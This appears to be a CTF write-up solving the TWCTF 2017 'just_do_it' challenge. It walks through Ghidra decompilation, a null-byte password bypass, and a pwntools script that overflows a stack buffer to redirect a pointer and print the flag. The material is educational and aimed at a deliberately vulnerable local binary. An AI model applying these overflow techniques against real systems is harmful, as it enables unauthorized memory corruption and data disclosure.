---
title: Tokyo Western'17 Just do it  
description: A classic pwn challenge from TWCTF 2017 involving a simple password check and a stack-based buffer overflow that lets us redirect output to leak the flag.
---

![google-ctf-banner](https://github.com/user-attachments/assets/3c9cd870-676c-40e8-8a38-4f49c1e7360a)

`date: 21 Sep 2025`

This is pwn challange from Tokyo Western 2017 CTF.

### Table of content

1. [Basic Info](#basic-info)
2. [Reversing with Ghidra](#Reversing-with-ghidra)
3. [Exploit](#exploit)
4. [Conclusion](#conclusion)

### Basic Info

Let's begin with checking the type and security of the binary -

```
file just_do_it
```

Output :

```
just_do_it: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=cf72d1d758e59a5b9912e0e83c3af92175c6f629, not stripped
```

Checking security -

```
pwn checksec just_do_it 
```

Output :

```
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

From the output of both of the commands we can see -

- It is 32 bit binary using Least Significant byte (LSB) format.
- Security of the Global Offset Table is set to partial RELRO means some of the addresses of the functions imported from linked libraries can be changed.
- There is no stack canary means buffer overflow is possible.

Now let's run the binary and check it's behaviour -

```
kris3c@0x4B1T-ubuntu:~/Main/Nightmare/modules/04-bof_variable/tw17_justdoit$ ./just_do_it

Welcome my secret service. Do you know the password?
Input the password.
12345678
Invalid Password, Try Again!
```

We can see it is asking for some kinda password and maybe checking against hardcoded password and when they didn't matched it is printing `Invalid Password, Try Again!`.


### Reversing with Ghidra 

To get the higher level view of the binary we can open in ghidra -

```
undefined4 main(void)

{
   char *flag_read_check;
   int iVar1;
   char input_buffer [16];
   FILE *flag_fd;
   char *final_output;
   undefined1 *local_c;
   
   local_c = &stack0x00000004;
   setvbuf(stdin,(char *)0x0,2,0);
   setvbuf(stdout,(char *)0x0,2,0);
   setvbuf(stderr,(char *)0x0,2,0);
   final_output = failed_message;
   flag_fd = fopen("flag.txt","r");
   if (flag_fd == (FILE *)0x0) {
      perror("file open error.\n");
                              /* WARNING: Subroutine does not return */
      exit(0);
   }
   flag_read_check = fgets(flag,0x30,flag_fd);
   if (flag_read_check == (char *)0x0) {
      perror("file read error.\n");
                              /* WARNING: Subroutine does not return */
      exit(0);
   }
   puts("Welcome my secret service. Do you know the password?" );
   puts("Input the password.");
   flag_read_check = fgets(input_buffer,0x20,stdin);
   if (flag_read_check == (char *)0x0) {
      perror("input error.\n");
                              /* WARNING: Subroutine does not return */
      exit(0);
   }
   iVar1 = strcmp(input_buffer,PASSWORD);
   if (iVar1 == 0) {
      final_output = success_message;
   }
   puts(final_output);
   return 0;
}
```

From the Ghidra's Decompiler's result we can understand the Execution flow -

1. `Failed_message` - `Invalid Password,_Try_Again!` stored in `final_output` variable.
2. Opening a flag.txt file which is present in the current directory.
3. Reading from the `flag.txt` file and storing it in at memory address defined by `flag`.
4. Prints `Welcome my secret service. Do you know the password \n Input the password.`
5. Asking for input and then store it in `input_buffer` having max size `0x20` - 16 bytes
6. Comparing input with string stored in `PASSWORD` which can be checked by double clicking on it - `P@SSW0RD`.
	1. If not matched then  prints the value of `final_output` which is intially set to - `Invalid Password,_Try_Again!`
	2. If matched value of the final_output will be equal to - `Correct Password,_Welcome!` adn then print it to console.

If you have  followed all the steps then a question should come in your mind - But what about the flag?

But leave the question behind and let's first check it the password works or not - 

```
kris3c@0x4B1T-ubuntu:~/Main/Nightmare/modules/04-bof_variable/tw17_justdoit$ ./just_do_it

Welcome my secret service. Do you know the password?
Input the password.
P@SSW0RD
Invalid Password, Try Again!
```

But why? For answering this we can open the bianry in `pwndbg` -

![Screenshot From 2025-09-21 17-25-01.png](:/a2cf23f3b698446e95218fba26917d38)

As we can see the binary is comparing the input with a string that does not ends with newline character `\n` but when we input the string in CLI a newline character is auto injected so to bypass this we have to append null byte to our input :

```
python3 -c "f = open('input.txt','bw');f.write(b'P@SSW0RD'+b'\x00')"
```

```
kris3c@0x4B1T-ubuntu:~/Main/Nightmare/modules/04-bof_variable/tw17_justdoit$ ./just_do_it < input.txt 
Welcome my secret service. Do you know the password?
Input the password.
Correct Password, Welcome!
```

Now what about the flag?

### Buffer Overflow 

From the code section we can see whether the condition of `input == PASSWORD` matches or not it prints the content present at the address stored in  `final_output` so what if we change the stored address to the address where the flag is stored and to do this we can check where the `final_output` is stored in the stack (double click on any variable from the declaration seciton) -  

<img width="861" height="383" alt="Screenshot From 2025-09-21 18-47-02" src="https://github.com/user-attachments/assets/93770d77-0bcc-441c-a849-f7627bf12424" />

Here we can see `final_output` is stored at `start_address_of_stack-0x14` and the `input_buffer` is at `start_address_of_stack-0x28` and the gap between both is 20 bytes so to replace the address stored in `final_output` with the address of the flag we need to inject 20 null bytes following the address. 

To know the address of the `flag` - Program Tree -> Lables -> flag 


<img width="1099" height="437" alt="Screenshot From 2025-09-21 18-59-42" src="https://github.com/user-attachments/assets/abb3511b-33f9-4b9b-aa45-124f1092ff32" />

The address is `0x804a080`.

### Exploit

Writing exploit with all the collected information is so straight forward -

```python
#!/bin/python3

from pwn import *

p = process("./just_do_it")


p.sendlineafter("Input the password.",b'\x00'*20+p32(0x804a080))

print(p.recvall().decode())
```

Running the script -

```
kris3c@0x4B1T-ubuntu:~/Main/Nightmare/modules/04-bof_variable/tw17_justdoit$ ./my_script.py 
[+] Starting local process './just_do_it': pid 7094
/usr/lib/python3/dist-packages/pwnlib/tubes/tube.py:876: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[+] Receiving all data: Done (34B)
[*] Process './just_do_it' stopped with exit code 0 (pid 7094)

TWCTF{REDACTED}
```

We got the flag and this marks the end of this writeup.

### Conclusion

By analyzing the binary with Ghidra and exploiting the stack layout, we bypassed the password check and redirected output to leak the flag. The challenge was a solid exercise in buffer overflows and reinforced the importance of understanding how memory is managed on the stack
